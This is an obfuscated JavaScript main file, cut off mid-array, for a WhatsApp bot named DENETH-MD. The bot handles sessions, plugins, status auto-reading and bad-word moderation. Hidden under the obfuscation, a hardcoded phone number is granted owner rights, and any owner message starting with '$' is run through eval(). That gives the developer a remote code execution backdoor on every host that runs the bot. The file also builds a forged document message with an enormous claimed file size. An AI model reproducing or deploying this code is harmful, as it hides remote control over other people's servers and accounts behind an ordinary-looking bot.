function _0x3e70(_0x22d57a,_0xe22d65){const _0x3bb544=_0x3bb5();return _0x3e70=function(_0x3e70ec,_0xac76f7){_0x3e70ec=_0x3e70ec-0xf7;let _0x2a20df=_0x3bb544[_0x3e70ec];return _0x2a20df;},_0x3e70(_0x22d57a,_0xe22d65);}const _0x15f743=_0x3e70;(function(_0x91a385,_0x10318f){const _0x341eae=_0x3e70,_0x4fa358=_0x91a385();while(!![]){try{const _0x3e49b1=parseInt(_0x341eae(0x19c))/0x1*(parseInt(_0x341eae(0x18f))/0x2)+parseInt(_0x341eae(0x120))/0x3*(-parseInt(_0x341eae(0x1b1))/0x4)+-parseInt(_0x341eae(0x160))/0x5+parseInt(_0x341eae(0x11e))/0x6*(parseInt(_0x341eae(0x13b))/0x7)+-parseInt(_0x341eae(0x11b))/0x8*(parseInt(_0x341eae(0x18b))/0x9)+-parseInt(_0x341eae(0x103))/0xa+parseInt(_0x341eae(0x173))/0xb;if(_0x3e49b1===_0x10318f)break;else _0x4fa358['push'](_0x4fa358['shift']());}catch(_0x5a9cb3){_0x4fa358['push'](_0x4fa358['shift']());}}}(_0x3bb5,0x4f539));const {default:makeWASocket,getAggregateVotesInPollMessage,useMultiFileAuthState,DisconnectReason,getDevice,fetchLatestBaileysVersion,jidNormalizedUser,getContentType,Browsers,makeInMemoryStore,makeCacheableSignalKeyStore,downloadContentFromMessage,generateWAMessageFromContent,prepareWAMessageMedia,proto}=require(_0x15f743(0x123)),fs=require('fs'),P=require(_0x15f743(0x188)),config=require(_0x15f743(0x13a)),figlet=require(_0x15f743(0x115)),lolcatjs=require(_0x15f743(0x137)),FileType=require(_0x15f743(0x125)),chalk=require('chalk'),qrcode=require(_0x15f743(0x17e)),NodeCache=require(_0x15f743(0x1a0)),util=require(_0x15f743(0x13e)),{getBuffer,getGroupAdmins,getRandom,h2k,isUrl,Json,runtime,sleep,fetchJson,fetchBuffer,getFile}=require(_0x15f743(0x199)),{sms,downloadMediaMessage}=require('./lib/msg'),axios=require('axios'),{File}=require('megajs'),path=require(_0x15f743(0x128)),msgRetryCounterCache=new NodeCache(),ownerNumber=[_0x15f743(0x148)],l=console['log'];if(!fs[_0x15f743(0x14d)](__dirname+_0x15f743(0x1ae))){if(config[_0x15f743(0x180)]){const sessdata=config[_0x15f743(0x180)][_0x15f743(0x1b5)](_0x15f743(0x1a1),''),filer=File[_0x15f743(0x10f)]('https://mega.nz/file/'+sessdata);filer[_0x15f743(0x18a)]((_0xdd30d8,_0x2950b7)=>{const _0x1b80d4=_0x15f743;if(_0xdd30d8)throw _0xdd30d8;fs[_0x1b80d4(0x14f)](__dirname+_0x1b80d4(0x1ae),_0x2950b7,()=>{const _0x4d0975=_0x1b80d4;console[_0x4d0975(0x14c)]('Session\x20Download\x20Completed\x20!');});});}}const express=require(_0x15f743(0x19d)),app=express(),port=process['env'][_0x15f743(0x1a8)]||0x1f40;async function connectToWA(){const _0x3a4b07=_0x15f743,{version:_0x9a9820,isLatest:_0x158c8e}=await fetchLatestBaileysVersion();console[_0x3a4b07(0x14c)](_0x3a4b07(0x151)+_0x9a9820[_0x3a4b07(0x149)]('.')+_0x3a4b07(0x1b2)+_0x158c8e);const {state:_0x54e1ca,saveCreds:_0xd17c79}=await useMultiFileAuthState(__dirname+_0x3a4b07(0x176)),_0xf7ea78=makeWASocket({'logger':P({'level':_0x3a4b07(0x139)}),'printQRInTerminal':!![],'browser':Browsers[_0x3a4b07(0x11f)](_0x3a4b07(0x15f)),'syncFullHistory':!![],'auth':_0x54e1ca,'version':_0x9a9820});_0xf7ea78['ev']['on'](_0x3a4b07(0x19e),async _0x18a566=>{const _0x12db46=_0x3a4b07,{connection:_0x95d195,lastDisconnect:_0x43be3b}=_0x18a566;if(_0x95d195===_0x12db46(0x109))_0x43be3b['error'][_0x12db46(0x17b)][_0x12db46(0x142)]!==DisconnectReason[_0x12db46(0x170)]&&connectToWA();else{if(_0x95d195===_0x12db46(0x162)){console['log'](_0x12db46(0xfc)),lolcatjs['fromString'](_0x12db46(0x140));const _0x36e26d=require('path');fs[_0x12db46(0x129)](_0x12db46(0x12e))[_0x12db46(0x158)](_0x3844d7=>{const _0x145d32=_0x12db46;_0x36e26d['extname'](_0x3844d7)[_0x145d32(0xfb)]()==_0x145d32(0x136)&&require('./plugins/'+_0x3844d7);}),console['clear'](),console[_0x12db46(0x14c)](_0x12db46(0xfc)),lolcatjs[_0x12db46(0x141)](chalk[_0x12db46(0x1b3)](figlet['textSync']('DENETH\x20MD',{'font':'Bloody','horizontalLayout':_0x12db46(0x111),'verticalLayout':_0x12db46(0x111),'whitespaceBreak':!![]}))),lolcatjs[_0x12db46(0x141)](chalk[_0x12db46(0x1b3)](figlet[_0x12db46(0x138)](_0x12db46(0x116),{'font':_0x12db46(0x186),'horizontalLayout':_0x12db46(0x111),'verticalLayout':_0x12db46(0x111),'whitespaceBreak':!![]}))),console[_0x12db46(0x14c)]('----------------------------------------------------'),lolcatjs['fromString']('Server\x20Started\x20✅'),console[_0x12db46(0x14c)](_0x12db46(0xfc)),console['log']('----------------------------------------------------'),lolcatjs[_0x12db46(0x141)](chalk['cyan'](figlet[_0x12db46(0x138)](_0x12db46(0x15b),{'font':'Bloody','horizontalLayout':'full','verticalLayout':'full','whitespaceBreak':!![]}))),console[_0x12db46(0x14c)](_0x12db46(0x172)),lolcatjs['fromString'](_0x12db46(0xf7)),console[_0x12db46(0x14c)](_0x12db46(0x18c)),lolcatjs[_0x12db46(0x141)]('DENETH-MD\x20Connected\x20SuccessFully\x20✅'),console[_0x12db46(0x14c)](_0x12db46(0x16a)),lolcatjs[_0x12db46(0x141)]('Created\x20By\x20Deneth\x20Hansaka\x20Keerthirathna'),console[_0x12db46(0x14c)](_0x12db46(0x12c)),await _0xf7ea78['sendMessage'](config[_0x12db46(0x181)]+_0x12db46(0x184),{'text':_0x12db46(0x194),'contextInfo':{'externalAdReply':{'title':_0x12db46(0x13c),'thumbnailUrl':'https://github.com/denethhansaka/DENETH-MD-Files/blob/main/Images/DENETH-MD.jpg?raw=true','sourceUrl':'','mediaType':0x1,'renderLargerThumbnail':!![]}}});}}}),_0xf7ea78['ev']['on'](_0x3a4b07(0x101),_0xd17c79),_0xf7ea78['ev']['on']('messages.upsert',async _0x1d40d7=>{const _0x3a7cfa=_0x3a4b07;try{_0x1d40d7=_0x1d40d7[_0x3a7cfa(0x12d)][0x0];if(!_0x1d40d7['message'])return;_0x1d40d7[_0x3a7cfa(0x183)]=getContentType(_0x1d40d7['message'])===_0x3a7cfa(0x106)?_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x106)][_0x3a7cfa(0x183)]:_0x1d40d7[_0x3a7cfa(0x183)];config[_0x3a7cfa(0xfe)]===_0x3a7cfa(0x152)&&(_0x1d40d7[_0x3a7cfa(0x119)]&&_0x1d40d7['key'][_0x3a7cfa(0x10a)]===_0x3a7cfa(0x12a)&&await _0xf7ea78[_0x3a7cfa(0x189)]([_0x1d40d7[_0x3a7cfa(0x119)]]));if(_0x1d40d7[_0x3a7cfa(0x119)]&&_0x1d40d7[_0x3a7cfa(0x119)][_0x3a7cfa(0x10a)]===_0x3a7cfa(0x12a))return;config['ALWAYS_ONLINE']=='true'?await _0xf7ea78[_0x3a7cfa(0x14a)](_0x3a7cfa(0x15d),_0x1d40d7[_0x3a7cfa(0x119)]['remoteJid']):await _0xf7ea78['sendPresenceUpdate'](_0x3a7cfa(0x16c),_0x1d40d7[_0x3a7cfa(0x119)][_0x3a7cfa(0x10a)]);config['AUTO_TYPING']==!![]&&_0xf7ea78[_0x3a7cfa(0x14a)](_0x3a7cfa(0x156),_0x1d40d7[_0x3a7cfa(0x119)][_0x3a7cfa(0x10a)]);config[_0x3a7cfa(0x174)]==!![]&&_0xf7ea78['sendPresenceUpdate'](_0x3a7cfa(0x14e),_0x1d40d7[_0x3a7cfa(0x119)][_0x3a7cfa(0x10a)]);const _0x5bbda3=sms(_0xf7ea78,_0x1d40d7),_0x5d046c=getContentType(_0x1d40d7[_0x3a7cfa(0x183)]),_0x1f3ab7=JSON[_0x3a7cfa(0x127)](_0x1d40d7[_0x3a7cfa(0x183)]),_0x46921d=_0x1d40d7[_0x3a7cfa(0x119)][_0x3a7cfa(0x10a)],_0x537383=_0x5d046c==_0x3a7cfa(0x121)&&_0x1d40d7['message'][_0x3a7cfa(0x121)][_0x3a7cfa(0x185)]!=null?_0x1d40d7['message'][_0x3a7cfa(0x121)][_0x3a7cfa(0x185)]['quotedMessage']||[]:[],_0x3eaaa1=_0x5d046c===_0x3a7cfa(0x102)?_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x102)]:_0x5d046c===_0x3a7cfa(0x121)?_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x121)][_0x3a7cfa(0x164)]:_0x5d046c=='interactiveResponseMessage'?_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x16f)]&&_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x16f)][_0x3a7cfa(0x196)]&&JSON[_0x3a7cfa(0x105)](_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x16f)][_0x3a7cfa(0x196)][_0x3a7cfa(0x135)])&&JSON[_0x3a7cfa(0x105)](_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x16f)]['nativeFlowResponseMessage'][_0x3a7cfa(0x135)])['id']:_0x5d046c=='templateButtonReplyMessage'?_0x1d40d7[_0x3a7cfa(0x183)]['templateButtonReplyMessage']&&_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x171)][_0x3a7cfa(0x143)]:_0x5d046c===_0x3a7cfa(0x121)?_0x1d40d7['message']['extendedTextMessage'][_0x3a7cfa(0x164)]:_0x5d046c=='imageMessage'&&_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x19f)]['caption']?_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x19f)][_0x3a7cfa(0x155)]:_0x5d046c==_0x3a7cfa(0x113)&&_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x113)][_0x3a7cfa(0x155)]?_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x113)][_0x3a7cfa(0x155)]:'',_0x3dce77=/^./[_0x3a7cfa(0x197)](_0x3eaaa1)?_0x3eaaa1['match'](/^./gi):'#',_0x38da66=_0x3eaaa1['startsWith'](_0x3dce77),_0xce7bb2=_0x38da66?_0x3eaaa1['slice'](_0x3dce77[_0x3a7cfa(0x169)])[_0x3a7cfa(0x13f)]()['split']('\x20')['shift']()[_0x3a7cfa(0xfb)]():'',_0x11b624=_0x3eaaa1[_0x3a7cfa(0x13f)]()[_0x3a7cfa(0x187)](/ +/)[_0x3a7cfa(0x1ac)](0x1),_0x1fd217=_0x11b624['join']('\x20'),_0x50399f=_0x46921d[_0x3a7cfa(0x15c)](_0x3a7cfa(0x100)),_0x1459e9=_0x1d40d7['key']['fromMe']?_0xf7ea78[_0x3a7cfa(0x11a)]['id'][_0x3a7cfa(0x187)](':')[0x0]+'@s.whatsapp.net'||_0xf7ea78[_0x3a7cfa(0x11a)]['id']:_0x1d40d7[_0x3a7cfa(0x119)][_0x3a7cfa(0x10b)]||_0x1d40d7[_0x3a7cfa(0x119)]['remoteJid'],_0x3c0242=_0x1459e9[_0x3a7cfa(0x187)]('@')[0x0],_0x1e4e19=_0xf7ea78[_0x3a7cfa(0x11a)]['id']['split'](':')[0x0],_0x4e87b8=_0x1d40d7[_0x3a7cfa(0x1a7)]||_0x3a7cfa(0x145),_0x5bc410=config[_0x3a7cfa(0x181)],_0x5c6b7d=_0x5bc410?.[_0x3a7cfa(0x150)](_0x3c0242),_0x57aadf=_0x3a7cfa(0xf9),_0x59e924=_0x57aadf?.[_0x3a7cfa(0x150)](_0x3c0242),_0xb0ba13='94763197926',_0x4d11bb=_0xb0ba13?.[_0x3a7cfa(0x150)](_0x3c0242),_0x2ca4ed='94761864425',_0x2281a9=_0x2ca4ed['includes'](_0x3c0242),_0x391d15=_0x1e4e19[_0x3a7cfa(0x150)](_0x3c0242),_0x2ea64f=_0x391d15?_0x391d15:_0x2281a9,_0x1dded7=ownerNumber[_0x3a7cfa(0x150)](_0x3c0242)||_0x2ea64f,_0x126041=await jidNormalizedUser(_0xf7ea78[_0x3a7cfa(0x11a)]['id']),_0x3d7907=_0x50399f?await _0xf7ea78[_0x3a7cfa(0x112)](_0x46921d)[_0x3a7cfa(0x10c)](_0x312c5=>{}):'',_0x45f86d=_0x50399f?_0x3d7907[_0x3a7cfa(0x18d)]:'',_0x4763c2=_0x50399f?await _0x3d7907['participants']:'',_0xf94488=_0x50399f?await getGroupAdmins(_0x4763c2):'',_0x53e77b=_0x50399f?_0xf94488[_0x3a7cfa(0x150)](_0x126041):![],_0x5d3b9f=_0x50399f?_0xf94488[_0x3a7cfa(0x150)](_0x1459e9):![],_0x4637e2=_0x5bbda3['message'][_0x3a7cfa(0x16e)]?!![]:![],_0x545635=_0x3fe0fc=>{const _0x315bdb=_0x3a7cfa;let _0x2a2bcf=_0x3fe0fc;for(let _0x4ba6c3=0x0;_0x4ba6c3<_0x2a2bcf[_0x315bdb(0x169)];_0x4ba6c3++){if(_0x2a2bcf[_0x4ba6c3]===_0x46921d)return!![];}return![];},_0x142907=async _0x23aeff=>{const _0x2b03d8=_0x3a7cfa;return await _0xf7ea78[_0x2b03d8(0x124)](_0x46921d,{'text':_0x23aeff,'contextInfo':{'mentionedJid':[''],'groupMentions':[],'forwardingScore':0x3e7,'isForwarded':!![],'forwardedNewsletterMessageInfo':{'newsletterJid':_0x2b03d8(0x178),'newsletterName':_0x2b03d8(0x165),'serverMessageId':0x3e7},'externalAdReply':{'title':'ᴅᴇɴᴇᴛʜ-ᴍᴅ\x20ᴠ1','body':_0x2b03d8(0x17c),'mediaType':0x1,'sourceUrl':_0x2b03d8(0x1b4),'thumbnailUrl':_0x2b03d8(0x1b0),'renderLargerThumbnail':!![],'showAdAttribution':![]}}},{'quoted':_0x1d40d7});};_0xf7ea78[_0x3a7cfa(0x17f)]=async(_0x2dc0d2,_0x424111)=>{const _0x3c0930=_0x3a7cfa;await _0xf7ea78['relayMessage'](_0x46921d,{'protocolMessage':{'key':_0x2dc0d2[_0x3c0930(0x119)],'type':0xe,'editedMessage':{'conversation':_0x424111}}},{});},_0xf7ea78[_0x3a7cfa(0xff)]=async(_0x15d70c,_0x1e8f86,_0x211414,_0x4fac78,_0x32e09e={})=>{const _0x2a1868=_0x3a7cfa;let _0x17b25c='',_0x3af7f5=await axios[_0x2a1868(0x191)](_0x1e8f86);_0x17b25c=_0x3af7f5[_0x2a1868(0x132)][_0x2a1868(0x1af)];if(_0x17b25c[_0x2a1868(0x187)]('/')[0x1]===_0x2a1868(0x108))return _0xf7ea78[_0x2a1868(0x124)](_0x15d70c,{'video':await getBuffer(_0x1e8f86),'caption':_0x211414,'gifPlayback':!![],..._0x32e09e},{..._0x32e09e});let _0x8d5006=_0x17b25c[_0x2a1868(0x187)]('/')[0x0]+_0x2a1868(0x182);if(_0x17b25c===_0x2a1868(0x144))return _0xf7ea78[_0x2a1868(0x124)](_0x15d70c,{'document':await getBuffer(_0x1e8f86),'mimetype':_0x2a1868(0x144),'caption':_0x211414,..._0x32e09e},{..._0x32e09e});if(_0x17b25c[_0x2a1868(0x187)]('/')[0x0]===_0x2a1868(0x15a))return _0xf7ea78[_0x2a1868(0x124)](_0x15d70c,{'image':await getBuffer(_0x1e8f86),'caption':_0x211414,..._0x32e09e},{..._0x32e09e});if(_0x17b25c[_0x2a1868(0x187)]('/')[0x0]===_0x2a1868(0x130))return _0xf7ea78[_0x2a1868(0x124)](_0x15d70c,{'video':await getBuffer(_0x1e8f86),'caption':_0x211414,'mimetype':_0x2a1868(0x193),..._0x32e09e},{..._0x32e09e});if(_0x17b25c[_0x2a1868(0x187)]('/')[0x0]===_0x2a1868(0xf8))return _0xf7ea78[_0x2a1868(0x124)](_0x15d70c,{'audio':await getBuffer(_0x1e8f86),'caption':_0x211414,'mimetype':_0x2a1868(0x166),..._0x32e09e},{..._0x32e09e});},_0xf7ea78[_0x3a7cfa(0x12b)]=async(_0x5beaa8,_0x548c1f,_0x3ac6b6=!![])=>{const _0x89c42f=_0x3a7cfa;let _0x4c41e7=_0x5beaa8[_0x89c42f(0x198)]?_0x5beaa8[_0x89c42f(0x198)]:_0x5beaa8,_0x56f075=(_0x5beaa8[_0x89c42f(0x198)]||_0x5beaa8)['mimetype']||'',_0x2a342d=_0x5beaa8['mtype']?_0x5beaa8[_0x89c42f(0x154)][_0x89c42f(0x1b5)](/Message/gi,''):_0x56f075[_0x89c42f(0x187)]('/')[0x0];const _0x59f49c=await downloadContentFromMessage(_0x4c41e7,_0x2a342d);let _0x446127=Buffer[_0x89c42f(0x19a)]([]);for await(const _0x20f3c3 of _0x59f49c){_0x446127=Buffer[_0x89c42f(0x147)]([_0x446127,_0x20f3c3]);}let _0x3a2858=await FileType[_0x89c42f(0x190)](_0x446127);return trueFileName=_0x3ac6b6?_0x548c1f+'.'+_0x3a2858[_0x89c42f(0x19b)]:_0x548c1f,await fs[_0x89c42f(0x159)](trueFileName,_0x446127),trueFileName;},_0xf7ea78[_0x3a7cfa(0x163)]=async(_0x340c22,_0x37b8ca,_0x969f0b,_0x4ef0ea={})=>{const _0x4cb085=_0x3a7cfa;let _0x4c7b85={'url':_0x4cb085(0x114),'mimetype':'application/pdf','fileSha256':_0x4cb085(0x126),'fileLength':0x5af3107a4000,'mediaKey':_0x4cb085(0x1ab),'fileName':_0x4cb085(0x192),'fileEncSha256':_0x4cb085(0x1a6),'directPath':'/v/t62.7119-24/32511132_500473132560305_5925723291063172577_n.enc?ccb=11-4&oh=01_Q5AaIKnXNmUWgmxyNn_1uxfEnGyiI-eCZ-BMRZdX3O2jhQq2&oe=66BE7A32&_nc_sid=5e03e0'},_0x30c2db=generateWAMessageFromContent(_0x340c22,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadata':{},'deviceListMetadataVersion':0x2},'interactiveMessage':{'body':{'text':_0x4ef0ea&&_0x4ef0ea[_0x4cb085(0x17a)]?_0x4ef0ea[_0x4cb085(0x17a)]:''},'footer':{'text':_0x4ef0ea&&_0x4ef0ea[_0x4cb085(0x16b)]?_0x4ef0ea[_0x4cb085(0x16b)]:''},'header':{'title':_0x4ef0ea&&_0x4ef0ea['header']?_0x4ef0ea['header']:'','hasMediaAttachment':!![],'documentMessage':_0x4c7b85},'nativeFlowMessage':{'buttons':_0x37b8ca,'messageParamsJson':''},'contextInfo':{'mentionedJid':['0@s.whatsapp.net'],'forwardingScore':0x3e7,'isForwarded':!![],'forwardedNewsletterMessageInfo':{'newsletterJid':_0x4cb085(0x178),'newsletterName':'DENETH-MD','serverMessageId':0x3e7},'externalAdReply':{'mediaType':0x1,'previewType':0x1,'renderLargerThumbnail':!![],'sourceUrl':_0x4cb085(0x131),'thumbnailUrl':_0x4ef0ea&&_0x4ef0ea[_0x4cb085(0x15a)]?_0x4ef0ea[_0x4cb085(0x15a)]:_0x4cb085(0x1b0),'title':_0x4cb085(0x13d),'body':_0x4cb085(0x17c)}}}}}},{'quoted':_0x969f0b});_0xf7ea78['relayMessage'](_0x340c22,_0x30c2db[_0x4cb085(0x183)],{'messageId':_0x30c2db[_0x4cb085(0x119)]['id']});};if(_0x59e924)!_0x4637e2&&await _0xf7ea78[_0x3a7cfa(0x124)](_0x46921d,{'react':{'text':'☺','key':_0x1d40d7[_0x3a7cfa(0x119)]}});else _0x4d11bb&&(!_0x4637e2&&await _0xf7ea78[_0x3a7cfa(0x124)](_0x46921d,{'react':{'text':'🪙','key':_0x1d40d7['key']}}));if(_0x46921d==='120363289450481087@g.us')return;const _0x4ba06a=require('./command'),_0x1d6974=_0x38da66?_0x3eaaa1[_0x3a7cfa(0x1ac)](0x1)[_0x3a7cfa(0x13f)]()[_0x3a7cfa(0x187)]('\x20')[0x0][_0x3a7cfa(0xfb)]():![];if(_0x38da66){const _0x838ea2=_0x4ba06a['commands'][_0x3a7cfa(0x168)](_0x1b1c1f=>_0x1b1c1f[_0x3a7cfa(0xfd)]===_0x1d6974)||_0x4ba06a[_0x3a7cfa(0x16d)]['find'](_0x40a372=>_0x40a372[_0x3a7cfa(0x110)]&&_0x40a372[_0x3a7cfa(0x110)]['includes'](_0x1d6974));if(_0x838ea2){if(_0x838ea2[_0x3a7cfa(0x1aa)])_0xf7ea78[_0x3a7cfa(0x124)](_0x46921d,{'react':{'text':_0x838ea2[_0x3a7cfa(0x1aa)],'key':_0x1d40d7[_0x3a7cfa(0x119)]}});try{_0x838ea2[_0x3a7cfa(0x1a2)](_0xf7ea78,_0x1d40d7,_0x5bbda3,{'from':_0x46921d,'prefix':_0x3dce77,'quoted':_0x537383,'body':_0x3eaaa1,'isCmd':_0x38da66,'command':_0xce7bb2,'args':_0x11b624,'q':_0x1fd217,'isGroup':_0x50399f,'sender':_0x1459e9,'senderNumber':_0x3c0242,'botNumber2':_0x126041,'botNumber':_0x1e4e19,'pushname':_0x4e87b8,'isMe':_0x2ea64f,'isOwner':_0x1dded7,'groupMetadata':_0x3d7907,'groupName':_0x45f86d,'participants':_0x4763c2,'groupAdmins':_0xf94488,'isBotAdmins':_0x53e77b,'isAdmins':_0x5d3b9f,'reply':_0x142907});}catch(_0x29f728){console[_0x3a7cfa(0x153)](_0x3a7cfa(0x177),_0x29f728);}}}_0x4ba06a[_0x3a7cfa(0x16d)]['map'](async _0x42b555=>{const _0x4440c2=_0x3a7cfa;if(_0x3eaaa1&&_0x42b555['on']===_0x4440c2(0x17a))_0x42b555['function'](_0xf7ea78,_0x1d40d7,_0x5bbda3,{'from':_0x46921d,'prefix':_0x3dce77,'quoted':_0x537383,'body':_0x3eaaa1,'isCmd':_0x38da66,'command':_0x42b555,'args':_0x11b624,'q':_0x1fd217,'isGroup':_0x50399f,'sender':_0x1459e9,'senderNumber':_0x3c0242,'botNumber2':_0x126041,'botNumber':_0x1e4e19,'pushname':_0x4e87b8,'isMe':_0x2ea64f,'isOwner':_0x1dded7,'groupMetadata':_0x3d7907,'groupName':_0x45f86d,'participants':_0x4763c2,'groupAdmins':_0xf94488,'isBotAdmins':_0x53e77b,'isAdmins':_0x5d3b9f,'reply':_0x142907});else{if(_0x1d40d7['q']&&_0x42b555['on']===_0x4440c2(0x164))_0x42b555[_0x4440c2(0x1a2)](_0xf7ea78,_0x1d40d7,_0x5bbda3,{'from':_0x46921d,'quoted':_0x537383,'body':_0x3eaaa1,'isCmd':_0x38da66,'command':_0x42b555,'args':_0x11b624,'q':_0x1fd217,'isGroup':_0x50399f,'sender':_0x1459e9,'senderNumber':_0x3c0242,'botNumber2':_0x126041,'botNumber':_0x1e4e19,'pushname':_0x4e87b8,'isMe':_0x2ea64f,'isOwner':_0x1dded7,'groupMetadata':_0x3d7907,'groupName':_0x45f86d,'participants':_0x4763c2,'groupAdmins':_0xf94488,'isBotAdmins':_0x53e77b,'isAdmins':_0x5d3b9f,'reply':_0x142907});else{if((_0x42b555['on']==='image'||_0x42b555['on']===_0x4440c2(0x161))&&_0x1d40d7[_0x4440c2(0x146)]===_0x4440c2(0x19f))_0x42b555[_0x4440c2(0x1a2)](_0xf7ea78,_0x1d40d7,_0x5bbda3,{'from':_0x46921d,'prefix':_0x3dce77,'quoted':_0x537383,'body':_0x3eaaa1,'isCmd':_0x38da66,'command':_0x42b555,'args':_0x11b624,'q':_0x1fd217,'isGroup':_0x50399f,'sender':_0x1459e9,'senderNumber':_0x3c0242,'botNumber2':_0x126041,'botNumber':_0x1e4e19,'pushname':_0x4e87b8,'isMe':_0x2ea64f,'isOwner':_0x1dded7,'groupMetadata':_0x3d7907,'groupName':_0x45f86d,'participants':_0x4763c2,'groupAdmins':_0xf94488,'isBotAdmins':_0x53e77b,'isAdmins':_0x5d3b9f,'reply':_0x142907});else _0x42b555['on']===_0x4440c2(0x11c)&&_0x1d40d7[_0x4440c2(0x146)]===_0x4440c2(0xfa)&&_0x42b555['function'](_0xf7ea78,_0x1d40d7,_0x5bbda3,{'from':_0x46921d,'prefix':_0x3dce77,'quoted':_0x537383,'body':_0x3eaaa1,'isCmd':_0x38da66,'command':_0x42b555,'args':_0x11b624,'q':_0x1fd217,'isGroup':_0x50399f,'sender':_0x1459e9,'senderNumber':_0x3c0242,'botNumber2':_0x126041,'botNumber':_0x1e4e19,'pushname':_0x4e87b8,'isMe':_0x2ea64f,'isOwner':_0x1dded7,'groupMetadata':_0x3d7907,'groupName':_0x45f86d,'participants':_0x4763c2,'groupAdmins':_0xf94488,'isBotAdmins':_0x53e77b,'isAdmins':_0x5d3b9f,'reply':_0x142907});}}});const _0x5a42d4=[_0x3a7cfa(0x133),_0x3a7cfa(0x1ad),'dapn','ewhahn',_0x3a7cfa(0x118),_0x3a7cfa(0x10d),_0x3a7cfa(0x122),_0x3a7cfa(0x179),'ewano'];for(let _0x37c27c of _0x5a42d4){if(_0x3eaaa1['toLowerCase']()[_0x3a7cfa(0x150)](_0x37c27c)){if(!_0x3eaaa1[_0x3a7cfa(0x150)](_0x3a7cfa(0x14b))&&!_0x3eaaa1['includes']('docu')&&!_0x3eaaa1['includes']('https')){let _0x55143a=await _0x537383['download']();if(_0x537383['imageMessage'])await _0xf7ea78[_0x3a7cfa(0x124)](_0x46921d,{'image':_0x55143a},{'quoted':_0x1d40d7});else _0x537383[_0x3a7cfa(0x113)]?await _0xf7ea78[_0x3a7cfa(0x124)](_0x46921d,{'video':_0x55143a},{'quoted':_0x1d40d7}):console[_0x3a7cfa(0x14c)](_0x3a7cfa(0x175),_0x55143a[_0x3a7cfa(0x167)]);break;}}}const _0x44016b=await fetchJson('https://raw.githubusercontent.com/naughtybinu2004/lpl_menia/main/badwords.json');if(!_0x5d3b9f&&!_0x38da66)for(any in _0x44016b){if(_0x3eaaa1[_0x3a7cfa(0xfb)]()['includes'](_0x44016b[any])){if(!_0x3eaaa1[_0x3a7cfa(0x150)]('tent')){if(!_0x3eaaa1['includes'](_0x3a7cfa(0x104))){if(!_0x3eaaa1[_0x3a7cfa(0x150)](_0x3a7cfa(0x157))){if(_0xf94488[_0x3a7cfa(0x150)](_0x1459e9))return;if(_0x1d40d7[_0x3a7cfa(0x119)]['fromMe'])return;await _0xf7ea78[_0x3a7cfa(0x124)](_0x46921d,{'delete':_0x1d40d7['key']}),await _0xf7ea78['sendMessage'](_0x46921d,{'text':_0x3a7cfa(0x15e)}),await _0xf7ea78['groupParticipantsUpdate'](_0x46921d,[_0x1459e9],_0x3a7cfa(0x134));}}}}}switch(_0xce7bb2){case _0x3a7cfa(0x195):{let _0x2100e1=getDevice(_0x1d40d7[_0x3a7cfa(0x183)][_0x3a7cfa(0x121)][_0x3a7cfa(0x185)][_0x3a7cfa(0x1a4)]);_0x142907(_0x3a7cfa(0x12f)+_0x2100e1+_0x3a7cfa(0x107));}break;case'id':_0x142907(_0x5bbda3[_0x3a7cfa(0x1a5)]['id']);break;case _0x3a7cfa(0x117):_0x142907(_0x46921d);break;default:if(_0x1dded7&&_0x3eaaa1[_0x3a7cfa(0x1a3)]('$')){let _0x455c72=_0x3eaaa1[_0x3a7cfa(0x187)]('$')[0x1],_0x3652f8=_0x455c72[_0x3a7cfa(0x1b5)]('°',_0x3a7cfa(0x10e));try{let _0x53032c=await eval(_0x3652f8);typeof _0x53032c===_0x3a7cfa(0x1a9)?_0x142907(util[_0x3a7cfa(0x1b6)](_0x53032c)):_0x142907(util[_0x3a7cfa(0x1b6)](_0x53032c));}catch(_0x20faca){_0x142907(util[_0x3a7cfa(0x1b6)](_0x20faca));}}}}catch(_0x25b455){const _0x5658d5=String(_0x25b455);console['log'](_0x5658d5);}});}app[_0x15f743(0x18e)]('/',(_0x408104,_0x48985b)=>{const _0x2b9c0d=_0x15f743;_0x48985b[_0x2b9c0d(0x133)]('📟\x20Nebula\x20Working\x20successfully!');}),app[_0x15f743(0x17d)](port,()=>console[_0x15f743(0x14c)](_0x15f743(0x11d)+port)),setTimeout(async()=>{await connectToWA();},0x3e8);function _0x3bb5(){const _0xde0d96=['sendFileUrl','@g.us','creds.update','conversation','3941300FJNhcK','docu','parse','ephemeralMessage','\x20version*_','gif','close','remoteJid','participant','catch','danna','.toString()','fromURL','alias','full','groupMetadata','videoMessage','https://mmg.whatsapp.net/v/t62.7119-24/32511132_500473132560305_5925723291063172577_n.enc?ccb=11-4&oh=01_Q5AaIKnXNmUWgmxyNn_1uxfEnGyiI-eCZ-BMRZdX3O2jhQq2&oe=66BE7A32&_nc_sid=5e03e0&mms3=true','figlet','Bot','jid','ewanna','key','user','8LJKFWI','sticker','Nebula\x20Server\x20listening\x20on\x20port\x20http://localhost:','16374MYjVBH','macOS','1203jxmHSP','extendedTextMessage','evano','@whiskeysockets/baileys','sendMessage','file-type','FikZgFEcHv5jpyU1PhL10sPCmtsmcqnWUKaxot10tUU=','stringify','path','readdirSync','status@broadcast','downloadAndSaveMediaMessage','Thanks\x20For\x20Using\x20DENETH-MD','messages','./plugins/','*He\x20Is\x20Using*\x20_*Whatsapp\x20','video','https://whatsapp.com/channel/0029Vamo0kT2ER6qNXgykO0B','headers','send','remove','paramsJson','.js','lolcatjs','textSync','silent','./config','427dteQwO','ᴅᴇɴᴇᴛʜ-ᴍᴅ\x20ᴠ1\x0aSuccessfully\x20Connected\x20!','ᴅᴇɴᴇᴛʜ-ᴍᴅ\x20ᴠ1','util','trim','•\x20Installing\x20Plugins...','fromString','statusCode','selectedId','application/pdf','ᴅᴇɴᴇᴛʜ_xᴅ','type','concat','94761864425','join','sendPresenceUpdate','tent','log','existsSync','recording','wri